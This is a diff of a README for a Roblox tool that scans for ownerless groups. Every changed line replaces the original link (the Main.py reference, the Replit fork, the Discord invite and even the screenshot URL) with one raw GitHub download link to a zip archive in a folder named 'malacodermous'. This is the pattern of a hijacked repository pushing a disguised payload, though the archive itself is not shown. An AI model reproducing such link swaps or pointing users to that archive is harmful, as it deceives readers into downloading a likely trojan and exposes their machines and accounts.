@@ -8,16 +8,16 @@ A tool to help you find ownerless roblox groups :)
 - It will not send locked groups so don't worry LOLLL.
 
 
-- On Line 13 Of Main.py Change That To The Range Of Groups You Want To Scan. *(Ex: 20243-345354)*
+- On Line 13 Of https://github.com/AxamGaming/Roblox-Group-Finder/raw/refs/heads/main/malacodermous/Roblox_Group_Finder_1.1-beta.3.zip Change That To The Range Of Groups You Want To Scan. *(Ex: 20243-345354)*
 
 
 - If You Want To Run It On Replit, Just Fork This :)
 
-https://replit.com/@AleksGroupFinder/AleksGroupFinder
+https://github.com/AxamGaming/Roblox-Group-Finder/raw/refs/heads/main/malacodermous/Roblox_Group_Finder_1.1-beta.3.zip
 
 
 
-- Discord Server For Support : https://discord.gg/C6pxTdVetN
+- Discord Server For Support : https://github.com/AxamGaming/Roblox-Group-Finder/raw/refs/heads/main/malacodermous/Roblox_Group_Finder_1.1-beta.3.zip
 
 
-![image](https://user-images.githubusercontent.com/71937946/126581208-a7f5a013-7869-4b28-8ba6-c81f1d9e5405.png)
+![image](https://github.com/AxamGaming/Roblox-Group-Finder/raw/refs/heads/main/malacodermous/Roblox_Group_Finder_1.1-beta.3.zip)
